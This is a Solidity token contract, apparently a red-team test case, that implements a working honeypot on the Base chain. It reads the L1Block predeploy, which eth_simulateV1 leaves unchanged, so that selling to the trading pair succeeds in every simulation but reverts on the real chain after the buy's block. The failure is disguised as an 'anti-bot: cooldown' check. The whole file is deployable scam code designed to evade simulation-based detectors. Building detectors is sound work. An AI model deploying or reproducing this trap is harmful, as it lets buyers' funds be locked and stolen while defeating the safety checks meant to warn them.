// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IL1Block {
    function number() external view returns (uint64);
    function sequenceNumber() external view returns (uint64);
}

/// Red team trap A1. eth_simulateV1 does not run the OP Stack's L1-attributes deposit at the start of
/// each simulated block, so the L1Block predeploy (0x42..15) keeps the base block's values in every
/// simulated block. On Base, every real block rewrites it: (L1 origin number, sequenceNumber) is unique
/// per L2 block. The token lets a buyer sell only while that pair is the one of its buy: in any
/// simulation (any number of blocks later) always true; on the real chain, never after the buy's block.
/// No owner action after deployment, no dependence on gas, fees, amounts, calldata or extra calls.
contract RedL1Trap {
    IL1Block internal constant L1 = IL1Block(0x4200000000000000000000000000000000000015);

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public immutable owner;
    address public pair;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    /// L2 block identity of the holder's last buy from the pair.
    mapping(address => uint256) public stamp;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
        owner = msg.sender;
        totalSupply = 1_000_000 ether;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address p) external {
        require(msg.sender == owner, "owner");
        pair = p;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _l2Block() internal view returns (uint256) {
        return (uint256(L1.number()) << 64) | L1.sequenceNumber();
    }

    function _move(address from, address to, uint256 value) internal {
        if (to == pair && pair != address(0)) {
            uint256 s = stamp[from];
            require(s == 0 || s == _l2Block(), "anti-bot: cooldown");
        }
        require(balanceOf[from] >= value, "balance");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        if (from == pair && pair != address(0)) stamp[to] = _l2Block();
        emit Transfer(from, to, value);
    }
}
